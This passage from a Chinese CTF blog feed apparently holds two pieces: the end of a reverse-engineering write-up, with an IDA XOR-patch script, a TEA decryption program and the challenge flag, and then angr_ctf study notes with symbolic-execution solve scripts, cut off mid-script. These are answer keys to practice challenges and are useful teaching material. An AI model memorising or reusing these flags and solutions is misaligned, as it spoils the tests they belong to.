src="/p/wpFor-2020HSCTF/image-20201021221934747.png"></p><p>这时候我们可以猜测它<strong>被smc技术保护</strong>，实锤就是在上面一个不起眼(?)的<code>ignoreMe</code>函数里把加密函数所在的地址进行了xor。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021221843431.png"></p><p><img src="/p/wpFor-2020HSCTF/image-20201021221852339.png"></p><p>也就是说，程序目前的<code>encrypt_0v0</code>部分的机器码是有问题的，需要通过这个xor函数以后程序才能正常进行。</p><p>那我们可以通过IDA自带的脚本功能进行patch，将那一部分的函数“修正”，让改函数能正常反编译，给我们呈现出这个部分的伪代码。</p><p>注意，<strong>这里只是伪修正</strong>，只改这里然后将patch的部分应用到输入文件的话程序是无法运行的，需要把xor函数nop（全部patch成90）才能消除影响（不过在这里正常运行似乎没什么必要x）。</p><p>我们找到<code>encrypt_0v0</code>部分，看到函数起始地址是0x401448，加密长度是189。</p><p>然后写出patch的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch</span>(<span class="params">start,end,key</span>):</span></span><br><span class="line">    n=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(start+n!=end+<span class="number">1</span>):</span><br><span class="line">        addr=start+n</span><br><span class="line">        PatchByte(addr,Byte(addr)^key)</span><br><span class="line">        n+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">&quot;%d Byte has been changed&quot;</span>%n)</span><br><span class="line"></span><br><span class="line">codeStart=<span class="number">0x401448</span></span><br><span class="line">codeLen=<span class="number">189</span></span><br><span class="line">xorData=<span class="number">0x56</span></span><br><span class="line">patch(codeStart,codeStart+codeLen<span class="number">-1</span>,xorData)</span><br></pre></td></tr></table></figure><p>点击File-&gt;Script file，导入脚本运行。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021193817717.png"></p><p>可以看到<code>encrypt_0v0</code>函数发生了变化，同时消息窗口有“189 Byte has been changed”字样。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021222015428.png"></p><p>点击Edit-&gt;Patch program-&gt;Apply patches to input file，将patch的部分应用到输入文件中（<strong>便于让ida重新分析</strong>）。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021201242220.png"></p><p>关掉，重新用ida打开，按<code>F5</code>进行反编译可得：</p><p><img src="/p/wpFor-2020HSCTF/image-20201021222140980.png"></p><p>是显而易见的TEA加密形式（比如特殊常数0x9E3779B9或者0x61C88647）。</p><p>这里key是<code>[v4,v5,v6,v7]=[0x33221100,0x77665544,0xBBAA9988,0xFFEEDDCC]</code>。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021222301862.png"></p><p>明文是flag，密文是v8~v12转成的char数组：<code>&#123;0xa8,0xa,0xe4,0xe3,0x13,0x5c,0xfa,0x8,0xd,0x5c,0xe1,0x90,0x25,0x12,0x76,0x36,0x51,0x10,0xc4,0x11,0xf6,0xd8,0xf8,0x82&#125;</code>。</p><p>为什么不是<code>&#123;0xe3,0xe4,0x0a,0xa8,...&#125;</code>呢，这就要看它们在内存中的存储方式（小端序）了，具体自行搜索。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021222314220.png"></p><p>于是exp就可以写了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> flag[]=&#123;<span class="number">0xa8</span>,<span class="number">0xa</span>,<span class="number">0xe4</span>,<span class="number">0xe3</span>,<span class="number">0x13</span>,<span class="number">0x5c</span>,<span class="number">0xfa</span>,<span class="number">0x8</span>,<span class="number">0xd</span>,<span class="number">0x5c</span>,<span class="number">0xe1</span>,<span class="number">0x90</span>,<span class="number">0x25</span>,<span class="number">0x12</span>,<span class="number">0x76</span>,<span class="number">0x36</span>,<span class="number">0x51</span>,<span class="number">0x10</span>,<span class="number">0xc4</span>,<span class="number">0x11</span>,<span class="number">0xf6</span>,<span class="number">0xd8</span>,<span class="number">0xf8</span>,<span class="number">0x82</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> key[]=&#123;<span class="number">0x33221100</span>,<span class="number">0x77665544</span>,<span class="number">0xBBAA9988</span>,<span class="number">0xFFEEDDCC</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> * v, <span class="keyword">unsigned</span> <span class="keyword">int</span> * k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v0=v[<span class="number">0</span>],v1=v[<span class="number">1</span>],sum=<span class="number">0</span>,delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    sum=delta*<span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">        v1-=((v0&lt;&lt;<span class="number">4</span>)+k[<span class="number">2</span>])^(v0+sum)^((v0&gt;&gt;<span class="number">5</span>)+k[<span class="number">3</span>]);</span><br><span class="line">        v0-=((v1&lt;&lt;<span class="number">4</span>)+k[<span class="number">0</span>])^(v1+sum)^((v1&gt;&gt;<span class="number">5</span>)+k[<span class="number">1</span>]);</span><br><span class="line">        sum-=delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0;</span><br><span class="line">    v[<span class="number">1</span>]=v1;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> * p_int=(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)flag;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i+=<span class="number">2</span>) decrypt(&amp;p_int[i],(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag&#123;H4vE_gr3aT_7eA_Hah&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Ⅱ-动态调试直接看函数"><a href="#Ⅱ-动态调试直接看函数" class="headerlink" title="Ⅱ. 动态调试直接看函数"></a>Ⅱ. 动态调试直接看函数</h2><p>对付smc，还可以考虑动态调试。</p><blockquote><p> 环境是IDA pro v7.0，高版本可以直接调试32位程序。</p></blockquote><p>因为是32位程序，所以在ida目录下找到<code>.\dbgsrv\win32_remote.exe</code>，并打开：</p><p><img src="/p/wpFor-2020HSCTF/image-20201021230808381.png"></p><p>然后用ida打开文件，点击Debugger-&gt;Select debugger选择：</p><p><img src="/p/wpFor-2020HSCTF/image-20201021222928566.png"></p><p>然后点击Debugger-&gt;Process options调整设置（将Hostname设置成my ip就好）：</p><p><img src="/p/wpFor-2020HSCTF/image-20201021232439311.png"></p><p>断点设在<code>call ignoreMe</code>后面，此时<code>encrypt_0v0</code>已被处理，是正常函数。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021230327641.png"></p><p>然后按<code>F9</code>，开始调试，调试开始后程序暂停在断点处。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021231150383.png"></p><p>点开<code>encrypt_0v0</code>，（按空格从图形界面转到文字）。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021232553778.png"></p><p>选中这一部分的汇编代码，按<code>c</code>强转成代码（-&gt;Force-&gt;Yes）。将还包括在函数体内的语句按<code>d</code>再按<code>c</code>。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021232706452.png"></p><p><img src="/p/wpFor-2020HSCTF/image-20201021232729515.png"></p><p>然后选中刚才的地址区段，按<code>p</code>生成函数。</p><p><img src="/p/wpFor-2020HSCTF/image-20201021232847637.png"></p><p>最后按<code>F5</code>反编译得到：</p><p><img src="/p/wpFor-2020HSCTF/image-20201021232910621.png"></p><p>就可以看到加密函数了，后续解密步骤同Ⅰ。</p><p>其实这里从强转成代码开始的步骤同样适用于Ⅰ，只是相比之下直接重新打开ida让其重新分析更方便而已hhh。</p><h1 id="0xff-EOF…"><a href="#0xff-EOF…" class="headerlink" title="0xff EOF…?"></a>0xff EOF…?</h1><p><em><strong>一点乱七八糟的碎碎念，看完wp的可以关掉啦~</strong></em></p><p>这次新生赛是我CTF生涯中第一次出题（很开心能混迹在大佬云集的筹备委员会中0v0），在pc逆向这边除了Base64以外背了其他六道题的锅，感觉是一次很宝贵的经历。</p><p>所谓“出题才能学到更多”是真的。以前做题的时候，在ida里总是会点进一些看起来操作很多好像很有用的函数，但实际上有很多都是没有用的初始函数（编译源码的时候自动生成、ida反编译的时候也算上了的那种），都是在自己出完题目然后试图从选手的角度做的时候发现的。</p><p>以及比如像smc这种有点进阶考点的，本来做题也不是很懂原理（吧），就是单纯地走一个找函数patch回去的流程，然后出题的时候就单纯地按自己的想法写了（.data段没有执行的权限hhhh 一开始还把函数当成数组写到.data段里了xswl），然后就失败了x，幸好有大佬可以求助&#x3D;v&#x3D;。</p><p>还有就是写wp的时候每道题会去想一些别的路，争取把各个思路&amp;工具都科普出去（于是迫使自己接触一些平时不常用的工具）。比较遗憾的是没有合适的题目可以用来写<code>ida利用wsl2远程调试linux程序</code>和<code>angr/pintool的使用</code>吧。前者是没有出到用动态调试性价比更高的linux题目，后者是那些可以走爆破的题目分支多容易爆内存（像这个东西也是从去年vm的wp里学到的，就是想把这些宝藏工具传承下去）。</p><p>出题的时候说不要变成萌新劝退赛+要放点有意思的题目，于是就有了<strong>Funny_game</strong>和<strong>Magic_switch</strong>这两道以游戏为载体的题目。<strong>Funny_game</strong>本来是打算出成贪吃蛇的，不过考虑到去年的杂项就有贪吃蛇（偶然看到我们队去年的wp发现的），就想着不要出重复的了。刚好那段时间在等俄罗斯方块手游的N测（卑微打块人已经在小程序上打了很久的马拉松了），于是就拿别人的俄罗斯方块程序改了一下，加了个出flag的函数。说起来那么简单，实际上还是得把别人的程序看懂了才知道能在哪里加啊qvq 给写这个源程序的大佬磕头。一定要等于2020那里是我故意的哈哈哈，因为读程序的时候发现2020其实很容易达到，又为了契合年份（这六个题的所有常数都是有意义的嘿嘿，甚至连smc那个异或的0x56也是有意义的 <del>cy2的某首歌</del> ），于是就搞了个等于而不是大于等于。这个题出完以后我还闲着无聊打了几盘，没有保留功能不然就能凑tetris了。至于<strong>Magic_switch</strong>，参考了一下攻防世界逆向新手区里面game的玩法，但源码是自己撸的，感觉提升了一波写游戏代码的能力。</p><p><strong>Not_A_Sudoku</strong>的原意其实是真的想出一道数独的，源于某次比赛逆出来的py源码排版超级乱（一堆lambda看到眼花），然后被某个大佬发现是数独检验，直接当数独题做了。出题的时候就想搞一个类似的，不过后来想了想觉得数织的检验代码比数独优雅好多啊，写源码的话还不如去写数织的呢（所以这道题就叫Not_A_Sudoku了，顺便还能科普一下冷门的数织游戏。至于谜面，一目了然就是本命禅雅塔的“乱”了hhh。</p><p><strong>Maze</strong>真的是我最早有思路的题目，源于数据结构课本里用深搜&#x2F;栈走迷宫的图（上课没怎么听讲实锤了，以及不用队列走迷宫这个点真的很想让我吐槽），then一整节数据结构课上都在想构造这个maze的谜面hhh，以及一个埋成sloth彩蛋的文字押，下课就迅速掏出电脑把生成地图的常数数组写进去。像是把数字转成十六位二进制当成数组和hjkl控制光标上下左右这些点也是想科普的点吧hhh。</p><p><strong>Bytecode</strong>的出题本意是想让萌新们趁机入门python和一些反编译的操作，感觉比起汇编语法来说python字节码这个更容易理解一点，毕竟没涉及到寄存器操作之类的，甚至还保留了变量名。这个题真不难，就是考一点耐心和细心而已，欣慰的是还挺多队伍做出来了（自我感觉这个题比数织的要复杂，不知道为什么数织的解这么少XD）。原本还有一个foo4是维吉尼亚密码的加密，后来被嫌太难就删了。</p><p>预期中<strong>Deliver_TEA_to_dalao</strong>应该是最难的题，因为考虑到大部分人没接触过smc这种保护，没想到热身赛直接就放了个smc的题，那其实难度就大大降低（在热身赛的wp那里我连patch的脚本都给了），主要难点变成了TEA这个加密算法的识别了（对差点就做出来的TEA一直念念不忘），当然手写逆算法也不难hhh。</p><p>出完题以后觉得pc逆向这里防ak有点悬，没想到真就没防住被ak了（向大佬低头）。出题其实也是在另一个角度上的对基础知识的巩固吧，wp也写得很爽没有交作业的感觉，出题人表示体验极佳，下次一定再来 &#x2F;Doge。</p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> wp </tag>
            
            <tag> 华师CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angr_ctf刷题小记</title>
      <link href="p/logFor-Angr-CTF/"/>
      <url>p/logFor-Angr-CTF/</url>
      
        <content type="html"><![CDATA[<p>（&amp;&amp;angr入门？</p><p>超级无敌久之前划水的时候发现了一个可以用来逐步学习angr的题库：<a href="https://github.com/jakespringer/angr_ctf/">angr_ctf</a>。<br>刚好angr写脚本不太熟练，故开始（约等于从零开始的）学习并做下记录 <del>（方便后人踩坑</del> 。</p><p>持续更新ing…</p><a id="more"></a><h1 id="0xFF-一切的最开始"><a href="#0xFF-一切的最开始" class="headerlink" title="0xFF 一切的最开始"></a>0xFF 一切的最开始</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><blockquote><p>环境：win10(1909) + wsl(ubuntu 18.04)</p><p>python相关：python(3.6.9) + angr(9.0.4495) + templite(0.2.1)</p></blockquote><ul><li>上面github题库的环境是python2，但angr从8.0开始就放弃了对python2的支持，所以刷题的时候需要对题库脚本进行微调（py2-&gt;py3，比如print的东西需要用括号括起来）。</li><li>安装相关自行谷歌，建议安装angr的时候使用python虚拟环境（virtualenvwrapper）。</li><li>如遇到打开<code>XX_angr_find</code>时遇到报错：<code>Exec format error</code>，参考<a href="https://blog.csdn.net/fjh1997/article/details/105536828">这篇blog</a>；安装完qemu以后，每次遇到该error就执行一次<code>sudo service binfmt-support start</code>启用服务即可。</li></ul><h2 id="项目文件结构"><a href="#项目文件结构" class="headerlink" title="项目文件结构"></a>项目文件结构</h2><p>先把整个包download下来并解压，可以看到有每一个题目的文件夹（题目生成包，用来生成可执行文件，只需刷题的话大概没用），还有<code>dist</code>和<code>solutions</code>两个文件夹。</p><p><code>dist</code>里有：</p><ol><li><code>XX_xxxx</code>：每道题的elf。</li><li><code>scaffoldXX.py</code>：解题脚本挖空范例（题面，需要填空，注释用来解释语句的作用很详细）。</li></ol><p><code>solutions</code>里各道题的文件夹里有：</p><ol><li><code>XX_xxxx</code>：每道题的elf。</li><li><code>scaffoldXX.py</code>：解题脚本挖空范例（同上）。</li><li><code>solveXX.py</code>：解题脚本（正确答案&#x3D;v&#x3D;）。</li></ol><p>我的话直接转到<code>dist</code>文件夹里做了（懒得切目录）。</p><p>p.s. 具体学写脚本还是得看<code>scaffoldXX.py</code>里的注释 或者 <a href="https://www.anquanke.com/post/id/212816">这个系列</a>，这里只是一个做题记录罢了:&#x2F;</p><h2 id="SymbolicExecution-pptx"><a href="#SymbolicExecution-pptx" class="headerlink" title="SymbolicExecution.pptx"></a>SymbolicExecution.pptx</h2><p>angr理论相关不懂？</p><p>没关系，在主目录下的这个ppt文件<code>SymbolicExecution.pptx</code>中有超级无敌详细的说明！</p><p>（这也是我为什么要把这个ppt拎出来讲</p><p><img src="/p/logFor-Angr-CTF/image-20201111112712009.png" alt="SymbolicExecution.pptx"></p><p>内容大概有：</p><ul><li>符号执行的简介</li><li>angr的原理</li><li>angr在CTF中的应用</li><li>例题（压缩包里的题目）解析</li><li>…</li></ul><p>而且语言幽默风趣，辅以图片&amp;动画，完全冲散了对这种纯理论知识的恐惧（？）hhhh，建议在看到ppt的53页以后（也就是开始讲例题的地方）就可以先试着自己做题然后不懂的再回来看解析这样。</p><p>当然也可以直接通过<code>scaffoldXX.py</code>里的注释直接开始angr学习，但是到了后面光靠注释也看不懂的时候，就老老实实回来看ppt吧~</p><hr><h1 id="0x00-angr-find"><a href="#0x00-angr-find" class="headerlink" title="0x00 angr_find"></a>0x00 angr_find</h1><p>用ida打开文件定位到关键分支（“Good Job”）：</p><p><img src="/p/logFor-Angr-CTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201018161351.png" alt="IDA view"></p><p>把地址0x8048678（输出Good Job的地址）填进print_good_address里，整合得到脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">path_to_binary = <span class="string">&#x27;./00_angr_find&#x27;</span></span><br><span class="line">project = angr.Project(path_to_binary)</span><br><span class="line">initial_state = project.factory.entry_state()</span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">print_good_address = <span class="number">0x8048678</span></span><br><span class="line">simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="0x01-angr-avoid"><a href="#0x01-angr-avoid" class="headerlink" title="0x01 angr_avoid"></a>0x01 angr_avoid</h1><p>ida里打开，时间很长（，并且会出提示：</p><p><img src="/p/logFor-Angr-CTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201018164952.png"></p><p>并且analysis完以后按F5还会蹦出这个：</p><p><img src="/p/logFor-Angr-CTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201018164736.png"></p><p>[小小的脑袋里充满了大大的疑惑.jpg]</p><p>只能说真不愧是针对avoid出的题了。</p><p>既然没有图形界面（懒得设置配置文件）又不能反编译，那就走点小道好了。</p><p>shift+F12出strings window，然后双击进到“Good job”。</p><p><img src="/p/logFor-Angr-CTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201018165154.png" alt="strings window"></p><p>查看调用情况。</p><p><img src="/p/logFor-Angr-CTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201018170419.png"></p><p><img src="/p/logFor-Angr-CTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201018165226.png" alt="Xrefs_find"></p><p>在IDA view里定位到函数分支，填地址，over。</p><p>avoid同理：</p><p><img src="/p/logFor-Angr-CTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201018170811.png" alt="xrefs_avoid"></p><p>需要注意的是，反编译maybe_good()函数可以看出，should_succeed必须为1，而should_succeed还被avoid_me()函数调用改为0，所以avoid的地址还得加上avoid_me()函数的地址。</p><p>以及，一开始没angr成功（大意了），因为反编译complex_function()以后可以看到这个是必走的，只要在if那里避免转进“try again”就好。</p><p>最后的脚本（加了个测时间的）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">t = time.clock()</span><br><span class="line">path_to_binary = <span class="string">&#x27;./01_angr_avoid&#x27;</span></span><br><span class="line">project = angr.Project(path_to_binary)</span><br><span class="line">initial_state = project.factory.entry_state()</span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">print_good_address = <span class="number">0x80485DD</span></span><br><span class="line">will_not_succeed_address = [<span class="number">0x80485EF</span>,<span class="number">0x804855B</span>,<span class="number">0x80485A8</span>]</span><br><span class="line">simulation.explore(find=print_good_address, avoid=will_not_succeed_address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;time:&#x27;</span>,<span class="built_in">round</span>(time.clock()-t,<span class="number">2</span>),<span class="string">&#x27;s&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="0x02-angr-find-condition"><a href="#0x02-angr-find-condition" class="headerlink" title="0x02 angr_find_condition"></a>0x02 angr_find_condition</h1><p>用ida看ida view发现分支有无限多，但是奇怪的是反编译以后并没有看到这些（迷惑）。</p><p>像这个样子的：</p><p><img src="/p/logFor-Angr-CTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201018185037.png"></p><p>所以根据挖了空的题解脚本的提示填空就好。脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">t = time.clock()</span><br><span class="line">path_to_binary = <span class="string">&#x27;./02_angr_find_condition&#x27;</span></span><br><span class="line">project = angr.Project(path_to_binary)</span><br><span class="line">initial_state = project.factory.entry_state()</span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;time:&#x27;</span>,<span class="built_in">round</span>(time.clock()-t,<span class="number">2</span>),<span class="string">&#x27;s&#x27;</span>)</span><br></pre></td></tr></table></figure><p>一点点坑：</p><p>布尔变量那里一开始写的是<code>return i if stdout_output==b&quot;Good Job.&quot; else 0</code>，后来发现”Good Job.”不能跟stdout_output完全匹配（输出stdout_output可以看到是类似于<code>b&#39;Enter the password: Good Job.\n&#39;</code>的东西），所以懒得完全匹配就直接上in了。</p><hr><h1 id="0x03-angr-symbolic-registers"><a href="#0x03-angr-symbolic-registers" class="headerlink" title="0x03 angr_symbolic_registers"></a>0x03 angr_symbolic_registers</h1><p>这题的点在于angr能将数据直接注入到寄存器中（angr强大之处+1。</p><p><img src="/p/logFor-Angr-CTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201020113120-1605082519064.png"></p><p>查看get_user_input()的反编译窗口没什么作用，我选择反汇编。</p><p><img src="/p/logFor-Angr-CTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20201020113406-1605082503352.png"></p><p>可以看到三个输入分别被传入eax，ebx和edx中。</p><p><img src="/p/logFor-Angr-CTF/image-20201111162857821.png" alt="出栈传参情况"></p><p>ppt也有对这道题的tip：</p><p><img src="/p/logFor-Angr-CTF/image-20201111163014304.png"></p><p><img src="/p/logFor-Angr-CTF/image-20201111163023684.png"></p><p>所以写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">t = time.clock()</span><br><span class="line">path_to_binary = <span class="string">&#x27;./03_angr_symbolic_registers&#x27;</span></span><br><span class="line">project = angr.Project(path_to_binary)</span><br><span class="line">start_address = <span class="number">0x8048980</span></span><br><span class="line">initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">password0_size_in_bits = <span class="number">8</span>*<span class="number">0x4</span></span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, password0_size_in_bits)</span><br><span class="line">password1_size_in_bits = <span class="number">8</span>*<span class="number">0x4</span></span><br><span class="line">password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, password1_size_in_bits)</span><br><span class="line">password2_size_in_bits = <span class="number">8</span>*<span class="number">0x4</span></span><br><span class="line">password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, password2_size_in_bits)</span><br><span class="line"></span><br><span class="line">initial_state.regs.eax = password0</span><br><span class="line">initial_state.regs.ebx = password1</span><br><span class="line">initial_state.regs.edx = password2</span><br><span class="line"></span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br><span class="line">simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span 